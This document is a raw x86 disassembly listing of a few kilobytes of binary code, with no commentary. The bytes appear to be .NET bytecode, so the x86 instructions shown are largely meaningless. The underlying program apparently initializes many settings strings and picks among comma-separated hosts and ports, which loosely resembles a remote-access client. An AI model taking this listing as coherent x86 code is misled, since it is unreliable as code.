  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
  4025eb:	00 00                	add    %al,(%eax)
  4025ed:	02 20                	add    (%eax),%ah
  4025ef:	c3                   	ret
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 6f ee             	add    %ch,-0x12(%edi)
  4025f5:	00 00                	add    %al,(%eax)
  4025f7:	0a 2a                	or     (%edx),%ch
  4025f9:	02 20                	add    (%eax),%ah
  4025fb:	c2 00 00             	ret    $0x0
  4025fe:	00 6f ee             	add    %ch,-0x12(%edi)
  402601:	00 00                	add    %al,(%eax)
  402603:	0a 2a                	or     (%edx),%ch
  402605:	00 00                	add    %al,(%eax)
  402607:	00 1b                	add    %bl,(%ebx)
  402609:	30 02                	xor    %al,(%edx)
  40260b:	00 c5                	add    %al,%ch
  40260d:	00 00                	add    %al,(%eax)
  40260f:	00 01                	add    %al,(%ecx)
  402611:	00 00                	add    %al,(%eax)
  402613:	11 16                	adc    %edx,(%esi)
  402615:	0a 38                	or     (%eax),%bh
  402617:	0e                   	push   %cs
  402618:	00 00                	add    %al,(%eax)
  40261a:	00 20                	add    %ah,(%eax)
  40261c:	e8 03 00 00 28       	call   0x28402624
  402621:	14 00                	adc    $0x0,%al
  402623:	00 0a                	add    %cl,(%edx)
  402625:	06                   	push   %es
  402626:	17                   	pop    %ss
  402627:	58                   	pop    %eax
  402628:	0a 06                	or     (%esi),%al
  40262a:	7e 11                	jle    0x40263d
  40262c:	00 00                	add    %al,(%eax)
  40262e:	04 28                	add    $0x28,%al
  402630:	15 00 00 0a 32       	adc    $0x320a0000,%eax
  402635:	e5 28                	in     $0x28,%eax
  402637:	03 00                	add    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	3a 06                	cmp    (%esi),%al
  40263d:	00 00                	add    %al,(%eax)
  40263f:	00 16                	add    %dl,(%esi)
  402641:	28 16                	sub    %dl,(%esi)
  402643:	00 00                	add    %al,(%eax)
  402645:	0a 00                	or     (%eax),%al
  402647:	28 36                	sub    %dh,(%esi)
  402649:	00 00                	add    %al,(%eax)
  40264b:	06                   	push   %es
  40264c:	3a 06                	cmp    (%esi),%al
  40264e:	00 00                	add    %al,(%eax)
  402650:	00 16                	add    %dl,(%esi)
  402652:	28 16                	sub    %dl,(%esi)
  402654:	00 00                	add    %al,(%eax)
  402656:	0a 7e 0c             	or     0xc(%esi),%bh
  402659:	00 00                	add    %al,(%eax)
  40265b:	04 28                	add    $0x28,%al
  40265d:	17                   	pop    %ss
  40265e:	00 00                	add    %al,(%eax)
  402660:	0a 39                	or     (%ecx),%bh
  402662:	05 00 00 00 28       	add    $0x28000000,%eax
  402667:	26 00 00             	add    %al,%es:(%eax)
  40266a:	06                   	push   %es
  40266b:	7e 04                	jle    0x402671
  40266d:	00 00                	add    %al,(%eax)
  40266f:	04 28                	add    $0x28,%al
  402671:	17                   	pop    %ss
  402672:	00 00                	add    %al,(%eax)
  402674:	0a 39                	or     (%ecx),%bh
  402676:	05 00 00 00 28       	add    $0x28000000,%eax
  40267b:	24 00                	and    $0x0,%al
  40267d:	00 06                	add    %al,(%esi)
  40267f:	7e 0f                	jle    0x402690
  402681:	00 00                	add    %al,(%eax)
  402683:	04 28                	add    $0x28,%al
  402685:	17                   	pop    %ss
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 39                	or     (%ecx),%bh
  40268a:	0f 00 00             	sldt   (%eax)
  40268d:	00 28                	add    %ch,(%eax)
  40268f:	30 00                	xor    %al,(%eax)
  402691:	00 06                	add    %al,(%esi)
  402693:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  402699:	3f                   	aas
  40269a:	00 00                	add    %al,(%eax)
  40269c:	06                   	push   %es
  40269d:	28 34 00             	sub    %dh,(%eax,%eax,1)
  4026a0:	00 06                	add    %al,(%esi)
  4026a2:	dd 06                	fldl   (%esi)
  4026a4:	00 00                	add    %al,(%eax)
  4026a6:	00 26                	add    %ah,(%esi)
  4026a8:	dd 00                	fldl   (%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	00 00                	add    %al,(%eax)
  4026ae:	28 12                	sub    %dl,(%edx)
  4026b0:	00 00                	add    %al,(%eax)
  4026b2:	06                   	push   %es
  4026b3:	3a 0a                	cmp    (%edx),%cl
  4026b5:	00 00                	add    %al,(%eax)
  4026b7:	00 28                	add    %ch,(%eax)
  4026b9:	1e                   	push   %ds
  4026ba:	00 00                	add    %al,(%eax)
  4026bc:	06                   	push   %es
  4026bd:	28 1b                	sub    %bl,(%ebx)
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	dd 06                	fldl   (%esi)
  4026c4:	00 00                	add    %al,(%eax)
  4026c6:	00 26                	add    %ah,(%esi)
  4026c8:	dd 00                	fldl   (%eax)
  4026ca:	00 00                	add    %al,(%eax)
  4026cc:	00 20                	add    %ah,(%eax)
  4026ce:	88 13                	mov    %dl,(%ebx)
  4026d0:	00 00                	add    %al,(%eax)
  4026d2:	28 14 00             	sub    %dl,(%eax,%eax,1)
  4026d5:	00 0a                	add    %cl,(%edx)
  4026d7:	2b d4                	sub    %esp,%edx
  4026d9:	00 00                	add    %al,(%eax)
  4026db:	00 01                	add    %al,(%ecx)
  4026dd:	1c 00                	sbb    $0x0,%al
  4026df:	00 00                	add    %al,(%eax)
  4026e1:	00 33                	add    %dh,(%ebx)
  4026e3:	00 60 93             	add    %ah,-0x6d(%eax)
  4026e6:	00 06                	add    %al,(%esi)
  4026e8:	01 00                	add    %eax,(%eax)
  4026ea:	00 01                	add    %al,(%ecx)
  4026ec:	00 00                	add    %al,(%eax)
  4026ee:	9a 00 19 b3 00 06 01 	lcall  $0x106,$0xb31900
  4026f5:	00 00                	add    %al,(%eax)
  4026f7:	01 1b                	add    %ebx,(%ebx)
  4026f9:	30 02                	xor    %al,(%edx)
  4026fb:	00 2d 01 00 00 02    	add    %ch,0x2000001
  402701:	00 00                	add    %al,(%eax)
  402703:	11 28                	adc    %ebp,(%eax)
  402705:	19 00                	sbb    %eax,(%eax)
  402707:	00 0a                	add    %cl,(%edx)
  402709:	7e 07                	jle    0x402712
  40270b:	00 00                	add    %al,(%eax)
  40270d:	04 28                	add    $0x28,%al
  40270f:	1a 00                	sbb    (%eax),%al
  402711:	00 0a                	add    %cl,(%edx)
  402713:	6f                   	outsl  %ds:(%esi),(%dx)
  402714:	1b 00                	sbb    (%eax),%eax
  402716:	00 0a                	add    %cl,(%edx)
  402718:	80 07 00             	addb   $0x0,(%edi)
  40271b:	00 04 7e             	add    %al,(%esi,%edi,2)
  40271e:	07                   	pop    %es
  40271f:	00 00                	add    %al,(%eax)
  402721:	04 73                	add    $0x73,%al
  402723:	4b                   	dec    %ebx
  402724:	00 00                	add    %al,(%eax)
  402726:	06                   	push   %es
  402727:	80 0d 00 00 04 7e 0d 	orb    $0xd,0x7e040000
  40272e:	00 00                	add    %al,(%eax)
  402730:	04 7e                	add    $0x7e,%al
  402732:	01 00                	add    %eax,(%eax)
  402734:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402737:	4e                   	dec    %esi
  402738:	00 00                	add    %al,(%eax)
  40273a:	06                   	push   %es
  40273b:	80 01 00             	addb   $0x0,(%ecx)
  40273e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402741:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402746:	02 00                	add    (%eax),%al
  402748:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40274b:	4e                   	dec    %esi
  40274c:	00 00                	add    %al,(%eax)
  40274e:	06                   	push   %es
  40274f:	80 02 00             	addb   $0x0,(%edx)
  402752:	00 04 7e             	add    %al,(%esi,%edi,2)
  402755:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40275a:	03 00                	add    (%eax),%eax
  40275c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40275f:	4e                   	dec    %esi
  402760:	00 00                	add    %al,(%eax)
  402762:	06                   	push   %es
  402763:	80 03 00             	addb   $0x0,(%ebx)
  402766:	00 04 7e             	add    %al,(%esi,%edi,2)
  402769:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  40276e:	04 00                	add    $0x0,%al
  402770:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402773:	4e                   	dec    %esi
  402774:	00 00                	add    %al,(%eax)
  402776:	06                   	push   %es
  402777:	80 04 00 00          	addb   $0x0,(%eax,%eax,1)
  40277b:	04 7e                	add    $0x7e,%al
  40277d:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402782:	08 00                	or     %al,(%eax)
  402784:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402787:	4e                   	dec    %esi
  402788:	00 00                	add    %al,(%eax)
  40278a:	06                   	push   %es
  40278b:	80 08 00             	orb    $0x0,(%eax)
  40278e:	00 04 7e             	add    %al,(%esi,%edi,2)
  402791:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402796:	0e                   	push   %cs
  402797:	00 00                	add    %al,(%eax)
  402799:	04 6f                	add    $0x6f,%al
  40279b:	4e                   	dec    %esi
  40279c:	00 00                	add    %al,(%eax)
  40279e:	06                   	push   %es
  40279f:	80 0e 00             	orb    $0x0,(%esi)
  4027a2:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027a5:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027aa:	0c 00                	or     $0x0,%al
  4027ac:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027af:	4e                   	dec    %esi
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	80 0c 00 00          	orb    $0x0,(%eax,%eax,1)
  4027b7:	04 7e                	add    $0x7e,%al
  4027b9:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027be:	0f 00 00             	sldt   (%eax)
  4027c1:	04 6f                	add    $0x6f,%al
  4027c3:	4e                   	dec    %esi
  4027c4:	00 00                	add    %al,(%eax)
  4027c6:	06                   	push   %es
  4027c7:	80 0f 00             	orb    $0x0,(%edi)
  4027ca:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027cd:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027d2:	12 00                	adc    (%eax),%al
  4027d4:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027d7:	4e                   	dec    %esi
  4027d8:	00 00                	add    %al,(%eax)
  4027da:	06                   	push   %es
  4027db:	80 12 00             	adcb   $0x0,(%edx)
  4027de:	00 04 28             	add    %al,(%eax,%ebp,1)
  4027e1:	2d 00 00 06 80       	sub    $0x80060000,%eax
  4027e6:	10 00                	adc    %al,(%eax)
  4027e8:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027eb:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  4027f0:	0a 00                	or     (%eax),%al
  4027f2:	00 04 6f             	add    %al,(%edi,%ebp,2)
  4027f5:	4e                   	dec    %esi
  4027f6:	00 00                	add    %al,(%eax)
  4027f8:	06                   	push   %es
  4027f9:	80 0a 00             	orb    $0x0,(%edx)
  4027fc:	00 04 7e             	add    %al,(%esi,%edi,2)
  4027ff:	0d 00 00 04 7e       	or     $0x7e040000,%eax
  402804:	09 00                	or     %eax,(%eax)
  402806:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402809:	4e                   	dec    %esi
  40280a:	00 00                	add    %al,(%eax)
  40280c:	06                   	push   %es
  40280d:	28 1a                	sub    %bl,(%edx)
  40280f:	00 00                	add    %al,(%eax)
  402811:	0a 73 1c             	or     0x1c(%ebx),%dh
  402814:	00 00                	add    %al,(%eax)
  402816:	0a 80 0b 00 00 04    	or     0x400000b(%eax),%al
  40281c:	28 04 00             	sub    %al,(%eax,%eax,1)
  40281f:	00 06                	add    %al,(%esi)
  402821:	0a dd                	or     %ch,%bl
  402823:	08 00                	or     %al,(%eax)
  402825:	00 00                	add    %al,(%eax)
  402827:	26 16                	es push %ss
  402829:	0a dd                	or     %ch,%bl
  40282b:	00 00                	add    %al,(%eax)
  40282d:	00 00                	add    %al,(%eax)
  40282f:	06                   	push   %es
  402830:	2a 00                	sub    (%eax),%al
  402832:	00 00                	add    %al,(%eax)
  402834:	41                   	inc    %ecx
  402835:	1c 00                	sbb    $0x0,%al
	...
  40283f:	00 23                	add    %ah,(%ebx)
  402841:	01 00                	add    %eax,(%eax)
  402843:	00 23                	add    %ah,(%ebx)
  402845:	01 00                	add    %eax,(%eax)
  402847:	00 08                	add    %cl,(%eax)
  402849:	00 00                	add    %al,(%eax)
  40284b:	00 01                	add    %al,(%ecx)
  40284d:	00 00                	add    %al,(%eax)
  40284f:	01 1b                	add    %ebx,(%ebx)
  402851:	30 04 00             	xor    %al,(%eax,%eax,1)
  402854:	51                   	push   %ecx
  402855:	00 00                	add    %al,(%eax)
  402857:	00 02                	add    %al,(%edx)
  402859:	00 00                	add    %al,(%eax)
  40285b:	11 7e 0b             	adc    %edi,0xb(%esi)
  40285e:	00 00                	add    %al,(%eax)
  402860:	04 6f                	add    $0x6f,%al
  402862:	1d 00 00 0a 6f       	sbb    $0x6f0a0000,%eax
  402867:	1e                   	push   %ds
  402868:	00 00                	add    %al,(%eax)
  40286a:	0a 74 2f 00          	or     0x0(%edi,%ebp,1),%dh
  40286e:	00 01                	add    %al,(%ecx)
  402870:	28 19                	sub    %bl,(%ecx)
  402872:	00 00                	add    %al,(%eax)
  402874:	0a 7e 07             	or     0x7(%esi),%bh
  402877:	00 00                	add    %al,(%eax)
  402879:	04 6f                	add    $0x6f,%al
  40287b:	1f                   	pop    %ds
  40287c:	00 00                	add    %al,(%eax)
  40287e:	0a 28                	or     (%eax),%ch
  402880:	53                   	push   %ebx
  402881:	00 00                	add    %al,(%eax)
  402883:	06                   	push   %es
  402884:	72 01                	jb     0x402887
  402886:	00 00                	add    %al,(%eax)
  402888:	70 28                	jo     0x4028b2
  40288a:	20 00                	and    %al,(%eax)
  40288c:	00 0a                	add    %cl,(%edx)
  40288e:	7e 0a                	jle    0x40289a
  402890:	00 00                	add    %al,(%eax)
  402892:	04 28                	add    $0x28,%al
  402894:	1a 00                	sbb    (%eax),%al
  402896:	00 0a                	add    %cl,(%edx)
  402898:	6f                   	outsl  %ds:(%esi),(%dx)
  402899:	21 00                	and    %eax,(%eax)
  40289b:	00 0a                	add    %cl,(%edx)
  40289d:	0a dd                	or     %ch,%bl
  40289f:	08 00                	or     %al,(%eax)
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	26 16                	es push %ss
  4028a5:	0a dd                	or     %ch,%bl
  4028a7:	00 00                	add    %al,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	06                   	push   %es
  4028ac:	2a 00                	sub    (%eax),%al
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	01 10                	add    %edx,(%eax)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	00 00                	add    %al,(%eax)
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	47                   	inc    %edi
  4028b9:	47                   	inc    %edi
  4028ba:	00 08                	add    %cl,(%eax)
  4028bc:	31 00                	xor    %eax,(%eax)
  4028be:	00 01                	add    %al,(%ecx)
  4028c0:	13 30                	adc    (%eax),%esi
  4028c2:	01 00                	add    %eax,(%eax)
  4028c4:	9d                   	popf
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 00                	add    %al,(%eax)
  4028c9:	00 00                	add    %al,(%eax)
  4028cb:	00 72 0f             	add    %dh,0xf(%edx)
  4028ce:	00 00                	add    %al,(%eax)
  4028d0:	70 80                	jo     0x402852
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 04 72             	add    %al,(%edx,%esi,2)
  4028d7:	ea 00 00 70 80 02 00 	ljmp   $0x2,$0x80700000
  4028de:	00 04 72             	add    %al,(%edx,%esi,2)
  4028e1:	c5 01                	lds    (%ecx),%eax
  4028e3:	00 70 80             	add    %dh,-0x80(%eax)
  4028e6:	03 00                	add    (%eax),%eax
  4028e8:	00 04 72             	add    %al,(%edx,%esi,2)
  4028eb:	78 02                	js     0x4028ef
  4028ed:	00 70 80             	add    %dh,-0x80(%eax)
  4028f0:	04 00                	add    $0x0,%al
  4028f2:	00 04 72             	add    %al,(%edx,%esi,2)
  4028f5:	2b 03                	sub    (%ebx),%eax
  4028f7:	00 70 80             	add    %dh,-0x80(%eax)
  4028fa:	05 00 00 04 72       	add    $0x72040000,%eax
  4028ff:	39 03                	cmp    %eax,(%ebx)
  402901:	00 70 80             	add    %dh,-0x80(%eax)
  402904:	06                   	push   %es
  402905:	00 00                	add    %al,(%eax)
  402907:	04 72                	add    $0x72,%al
  402909:	4d                   	dec    %ebp
  40290a:	03 00                	add    (%eax),%eax
  40290c:	70 80                	jo     0x40288e
  40290e:	07                   	pop    %es
  40290f:	00 00                	add    %al,(%eax)
  402911:	04 72                	add    $0x72,%al
  402913:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402914:	03 00                	add    (%eax),%eax
  402916:	70 80                	jo     0x402898
  402918:	08 00                	or     %al,(%eax)
  40291a:	00 04 72             	add    %al,(%edx,%esi,2)
  40291d:	82 04 00 70          	addb   $0x70,(%eax,%eax,1)
  402921:	80 09 00             	orb    $0x0,(%ecx)
  402924:	00 04 72             	add    %al,(%edx,%esi,2)
  402927:	dd 16                	fstl   (%esi)
  402929:	00 70 80             	add    %dh,-0x80(%eax)
  40292c:	0a 00                	or     (%eax),%al
  40292e:	00 04 72             	add    %al,(%edx,%esi,2)
  402931:	90                   	nop
  402932:	1e                   	push   %ds
  402933:	00 70 80             	add    %dh,-0x80(%eax)
  402936:	0c 00                	or     $0x0,%al
  402938:	00 04 72             	add    %al,(%edx,%esi,2)
  40293b:	43                   	inc    %ebx
  40293c:	1f                   	pop    %ds
  40293d:	00 70 80             	add    %dh,-0x80(%eax)
  402940:	0e                   	push   %cs
  402941:	00 00                	add    %al,(%eax)
  402943:	04 72                	add    $0x72,%al
  402945:	f6 1f                	negb   (%edi)
  402947:	00 70 80             	add    %dh,-0x80(%eax)
  40294a:	0f 00 00             	sldt   (%eax)
  40294d:	04 14                	add    $0x14,%al
  40294f:	80 10 00             	adcb   $0x0,(%eax)
  402952:	00 04 72             	add    %al,(%edx,%esi,2)
  402955:	a9 20 00 70 80       	test   $0x80700020,%eax
  40295a:	11 00                	adc    %eax,(%eax)
  40295c:	00 04 72             	add    %al,(%edx,%esi,2)
  40295f:	ad                   	lods   %ds:(%esi),%eax
  402960:	20 00                	and    %al,(%eax)
  402962:	70 80                	jo     0x4028e4
  402964:	12 00                	adc    (%eax),%al
  402966:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402969:	00 00                	add    %al,(%eax)
  40296b:	00 1b                	add    %bl,(%ebx)
  40296d:	30 07                	xor    %al,(%edi)
  40296f:	00 f1                	add    %dh,%cl
  402971:	02 00                	add    (%eax),%al
  402973:	00 03                	add    %al,(%ebx)
  402975:	00 00                	add    %al,(%eax)
  402977:	11 18                	adc    %ebx,(%eax)
  402979:	17                   	pop    %ss
  40297a:	1c 73                	sbb    $0x73,%al
  40297c:	22 00                	and    (%eax),%al
  40297e:	00 0a                	add    %cl,(%edx)
  402980:	25 20 00 c8 00       	and    $0xc80020,%eax
  402985:	00 6f 23             	add    %ch,0x23(%edi)
  402988:	00 00                	add    %al,(%eax)
  40298a:	0a 25 20 00 c8 00    	or     0xc80020,%ah
  402990:	00 6f 24             	add    %ch,0x24(%edi)
  402993:	00 00                	add    %al,(%eax)
  402995:	0a 28                	or     (%eax),%ch
  402997:	07                   	pop    %es
  402998:	00 00                	add    %al,(%eax)
  40299a:	06                   	push   %es
  40299b:	7e 0e                	jle    0x4029ab
  40299d:	00 00                	add    %al,(%eax)
  40299f:	04 72                	add    $0x72,%al
  4029a1:	60                   	pusha
  4029a2:	21 00                	and    %eax,(%eax)
  4029a4:	70 28                	jo     0x4029ce
  4029a6:	25 00 00 0a 39       	and    $0x390a0000,%eax
  4029ab:	e3 00                	jecxz  0x4029ad
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	7e 02                	jle    0x4029b3
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	04 17                	add    $0x17,%al
  4029b5:	8d 39                	lea    (%ecx),%edi
  4029b7:	00 00                	add    %al,(%eax)
  4029b9:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c0:	26 00 00             	add    %al,%es:(%eax)
  4029c3:	0a 73 27             	or     0x27(%ebx),%dh
  4029c6:	00 00                	add    %al,(%eax)
  4029c8:	0a 7e 02             	or     0x2(%esi),%bh
  4029cb:	00 00                	add    %al,(%eax)
  4029cd:	04 17                	add    $0x17,%al
  4029cf:	8d 39                	lea    (%ecx),%edi
  4029d1:	00 00                	add    %al,(%eax)
  4029d3:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4029da:	26 00 00             	add    %al,%es:(%eax)
  4029dd:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  4029e3:	00 0a                	add    %cl,(%edx)
  4029e5:	9a 0a 7e 01 00 00 04 	lcall  $0x400,$0x17e0a
  4029ec:	17                   	pop    %ss
  4029ed:	8d 39                	lea    (%ecx),%edi
  4029ef:	00 00                	add    %al,(%eax)
  4029f1:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  4029f7:	6f                   	outsl  %ds:(%esi),(%dx)
  4029f8:	26 00 00             	add    %al,%es:(%eax)
  4029fb:	0a 73 27             	or     0x27(%ebx),%dh
  4029fe:	00 00                	add    %al,(%eax)
  402a00:	0a 7e 01             	or     0x1(%esi),%bh
  402a03:	00 00                	add    %al,(%eax)
  402a05:	04 17                	add    $0x17,%al
  402a07:	8d 39                	lea    (%ecx),%edi
  402a09:	00 00                	add    %al,(%eax)
  402a0b:	01 25 16 1f 2c 9d    	add    %esp,0x9d2c1f16
  402a11:	6f                   	outsl  %ds:(%esi),(%dx)
  402a12:	26 00 00             	add    %al,%es:(%eax)
  402a15:	0a 8e 69 6f 28 00    	or     0x286f69(%esi),%cl
  402a1b:	00 0a                	add    %cl,(%edx)
  402a1d:	9a 28 15 00 00 0a 0b 	lcall  $0xb0a,$0x1528
  402a24:	06                   	push   %es
  402a25:	28 1c 00             	sub    %bl,(%eax,%eax,1)
  402a28:	00 06                	add    %al,(%esi)
  402a2a:	39 52 00             	cmp    %edx,0x0(%edx)
  402a2d:	00 00                	add    %al,(%eax)
  402a2f:	06                   	push   %es
  402a30:	28 29                	sub    %ch,(%ecx)
  402a32:	00 00                	add    %al,(%eax)
  402a34:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402a37:	0d 38 39 00 00       	or     $0x3938,%eax
  402a3c:	00 08                	add    %cl,(%eax)
  402a3e:	09 a3 32 00 00 01    	or     %esp,0x1000032(%ebx)
  402a44:	13 04 28             	adc    (%eax,%ebp,1),%eax
  402a47:	06                   	push   %es
  402a48:	00 00                	add    %al,(%eax)
  402a4a:	06                   	push   %es
  402a4b:	11 04 07             	adc    %eax,(%edi,%eax,1)
  402a4e:	6f                   	outsl  %ds:(%esi),(%dx)
  402a4f:	2a 00                	sub    (%eax),%al
  402a51:	00 0a                	add    %cl,(%edx)
  402a53:	28 06                	sub    %al,(%esi)
  402a55:	00 00                	add    %al,(%eax)
  402a57:	06                   	push   %es
  402a58:	6f                   	outsl  %ds:(%esi),(%dx)
  402a59:	2b 00                	sub    (%eax),%eax
  402a5b:	00 0a                	add    %cl,(%edx)
  402a5d:	39 05 00 00 00 dd    	cmp    %eax,0xdd000000
  402a63:	c3                   	ret
  402a64:	00 00                	add    %al,(%eax)
  402a66:	00 dd                	add    %bl,%ch
  402a68:	06                   	push   %es
  402a69:	00 00                	add    %al,(%eax)
  402a6b:	00 26                	add    %ah,(%esi)
  402a6d:	dd 00                	fldl   (%eax)
  402a6f:	00 00                	add    %al,(%eax)
  402a71:	00 09                	add    %cl,(%ecx)
  402a73:	17                   	pop    %ss
  402a74:	58                   	pop    %eax
  402a75:	0d 09 08 8e 69       	or     $0x698e0809,%eax
  402a7a:	32 c1                	xor    %cl,%al
  402a7c:	38 a9 00 00 00 28    	cmp    %ch,0x28000000(%ecx)
  402a82:	06                   	push   %es
  402a83:	00 00                	add    %al,(%eax)
  402a85:	06                   	push   %es
  402a86:	06                   	push   %es
  402a87:	07                   	pop    %es
  402a88:	6f                   	outsl  %ds:(%esi),(%dx)
  402a89:	2c 00                	sub    $0x0,%al
  402a8b:	00 0a                	add    %cl,(%edx)
  402a8d:	38 98 00 00 00 73    	cmp    %bl,0x73000000(%eax)
  402a93:	2d 00 00 0a 13       	sub    $0x130a0000,%eax
  402a98:	05 72 6a 21 00       	add    $0x216a72,%eax
  402a9d:	70 72                	jo     0x402b11
  402a9f:	6a 21                	push   $0x21
  402aa1:	00 70 73             	add    %dh,0x73(%eax)
  402aa4:	2e 00 00             	add    %al,%cs:(%eax)
  402aa7:	0a 13                	or     (%ebx),%dl
  402aa9:	06                   	push   %es
  402aaa:	11 05 11 06 6f 2f    	adc    %eax,0x2f6f0611
  402ab0:	00 00                	add    %al,(%eax)
  402ab2:	0a 11                	or     (%ecx),%dl
  402ab4:	05 7e 0e 00 00       	add    $0xe7e,%eax
  402ab9:	04 6f                	add    $0x6f,%al
  402abb:	30 00                	xor    %al,(%eax)
  402abd:	00 0a                	add    %cl,(%edx)
  402abf:	17                   	pop    %ss
  402ac0:	8d 38                	lea    (%eax),%edi
  402ac2:	00 00                	add    %al,(%eax)
  402ac4:	01 25 16 72 6c 21    	add    %esp,0x216c7216
  402aca:	00 70 a2             	add    %dh,-0x5e(%eax)
  402acd:	16                   	push   %ss
  402ace:	6f                   	outsl  %ds:(%esi),(%dx)
  402acf:	31 00                	xor    %eax,(%eax)
  402ad1:	00 0a                	add    %cl,(%edx)
  402ad3:	13 07                	adc    (%edi),%eax
  402ad5:	11 07                	adc    %eax,(%edi)
  402ad7:	16                   	push   %ss
  402ad8:	a3 38 00 00 01       	mov    %eax,0x1000038
  402add:	80 02 00             	addb   $0x0,(%edx)
  402ae0:	00 04 11             	add    %al,(%ecx,%edx,1)
  402ae3:	07                   	pop    %es
  402ae4:	73 27                	jae    0x402b0d
  402ae6:	00 00                	add    %al,(%eax)
  402ae8:	0a 17                	or     (%edi),%dl
  402aea:	11 07                	adc    %eax,(%edi)
  402aec:	8e 69 6f             	mov    0x6f(%ecx),%gs
  402aef:	32 00                	xor    (%eax),%al
  402af1:	00 0a                	add    %cl,(%edx)
  402af3:	a3 38 00 00 01       	mov    %eax,0x1000038
  402af8:	80 01 00             	addb   $0x0,(%ecx)
  402afb:	00 04 28             	add    %al,(%eax,%ebp,1)
  402afe:	06                   	push   %es
  402aff:	00 00                	add    %al,(%eax)
  402b01:	06                   	push   %es
  402b02:	7e 02                	jle    0x402b06
  402b04:	00 00                	add    %al,(%eax)
  402b06:	04 7e                	add    $0x7e,%al
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	00 04 28             	add    %al,(%eax,%ebp,1)
  402b0d:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  402b12:	2c 00                	sub    $0x0,%al
  402b14:	00 0a                	add    %cl,(%edx)
  402b16:	dd 0f                	fisttpll (%edi)
  402b18:	00 00                	add    %al,(%eax)
  402b1a:	00 11                	add    %dl,(%ecx)
  402b1c:	05 39 07 00 00       	add    $0x739,%eax
  402b21:	00 11                	add    %dl,(%ecx)
  402b23:	05 6f 33 00 00       	add    $0x336f,%eax
  402b28:	0a dc                	or     %ah,%bl
  402b2a:	28 06                	sub    %al,(%esi)
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	06                   	push   %es
  402b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  402b30:	2b 00                	sub    (%eax),%eax
  402b32:	00 0a                	add    %cl,(%edx)
  402b34:	39 18                	cmp    %ebx,(%eax)
  402b36:	01 00                	add    %eax,(%eax)
  402b38:	00 17                	add    %dl,(%edi)
  402b3a:	28 13                	sub    %dl,(%ebx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	06                   	push   %es
  402b3f:	28 06                	sub    %al,(%esi)
  402b41:	00 00                	add    %al,(%eax)
  402b43:	06                   	push   %es
  402b44:	17                   	pop    %ss
  402b45:	73 34                	jae    0x402b7b
  402b47:	00 00                	add    %al,(%eax)
  402b49:	0a 16                	or     (%esi),%dl
  402b4b:	14 fe                	adc    $0xfe,%al
  402b4d:	06                   	push   %es
  402b4e:	1d 00 00 06 73       	sbb    $0x73060000,%eax
  402b53:	35 00 00 0a 73       	xor    $0x730a0000,%eax
  402b58:	36 00 00             	add    %al,%ss:(%eax)
  402b5b:	0a 28                	or     (%eax),%ch
  402b5d:	09 00                	or     %eax,(%eax)
  402b5f:	00 06                	add    %al,(%esi)
  402b61:	28 08                	sub    %cl,(%eax)
  402b63:	00 00                	add    %al,(%eax)
  402b65:	06                   	push   %es
  402b66:	28 06                	sub    %al,(%esi)
  402b68:	00 00                	add    %al,(%eax)
  402b6a:	06                   	push   %es
  402b6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402b6c:	37                   	aaa
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	0a 6f 38             	or     0x38(%edi),%ch
  402b72:	00 00                	add    %al,(%eax)
  402b74:	0a 17                	or     (%edi),%dl
  402b76:	8d 39                	lea    (%ecx),%edi
  402b78:	00 00                	add    %al,(%eax)
  402b7a:	01 25 16 1f 3a 9d    	add    %esp,0x9d3a1f16
  402b80:	6f                   	outsl  %ds:(%esi),(%dx)
  402b81:	26 00 00             	add    %al,%es:(%eax)
  402b84:	0a 16                	or     (%esi),%dl
  402b86:	a3 38 00 00 01       	mov    %eax,0x1000038
